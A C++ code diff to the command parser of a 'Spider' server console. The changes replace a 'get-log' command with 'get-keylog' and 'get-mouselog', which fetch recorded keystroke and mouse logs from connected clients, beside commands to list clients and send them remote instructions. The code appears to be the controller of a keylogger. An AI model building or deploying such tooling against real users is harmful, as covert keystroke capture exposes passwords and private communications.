@@ -11,7 +11,7 @@
 #include <iostream>
 #include <iomanip>
 #include "protobufMessages/SpiderEnvelop.pb.h"
-#include "protobufMessages/Commands.pb.h"
+#include "protobufMessages/SpiderCommands.pb.h"
 
 namespace Spider {
   class Command {
@@ -29,7 +29,8 @@ namespace Spider {
 
     const std::vector<std::tuple<std::string, std::string, std::string>> _serverCommands = {
       std::make_tuple("list-clients", "", "Get a list of all clients connected to the server."),
-      std::make_tuple("get-log", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
+      std::make_tuple("get-keylog", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
+      std::make_tuple("get-mouselog", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
       std::make_tuple("send", "<clientUUID> <method> [argument]", "Send a command to a client. Type \"commands\" for more precisions.")
     };
 
@@ -93,7 +94,7 @@ namespace Spider {
       _packet.mutable_payload()->PackFrom(ClientList());
     }
 
-    void isGetValid(std::vector<std::string> command)
+    void isGetKeylogValid(std::vector<std::string> command)
     {
       if (command.size() > 3 || command.size() < 2)
       {
@@ -111,6 +112,25 @@ namespace Spider {
         log.set_limit(1000);
       _packet.mutable_payload()->PackFrom(log);
     }
+
+      void isGetMouselogValid(std::vector<std::string> command)
+      {
+        if (command.size() > 3 || command.size() < 2)
+        {
+          help();
+          this->_isValid = false;
+          return;
+        }
+
+        _packet.set_clientid(command[1]);
+        _packet.set_payloadtype("GetClientMouseLog");
+          GetClientMouseLog log;
+        if (command.size() >= 3)
+          log.set_limit(std::stoi(command[2]));
+        else
+          log.set_limit(1000);
+        _packet.mutable_payload()->PackFrom(log);
+      }
 
     // Just check if the function is an existing one and if it contains the right arguments
     bool isSendCommandValid(std::vector<std::string> command)
@@ -189,8 +209,10 @@ namespace Spider {
         help();
       else if (splittedCommands[0] == "list-clients")
         isListValid(splittedCommands);
-      else if (splittedCommands[0] == "get-log")
-        isGetValid(splittedCommands);
+      else if (splittedCommands[0] == "get-keylog")
+        isGetKeylogValid(splittedCommands);
+      else if (splittedCommands[0] == "get-mouselog")
+          isGetMouselogValid(splittedCommands);
       else if (splittedCommands[0] == "send")
         isSendValid(splittedCommands);
       else if (splittedCommands[0] == "commands")
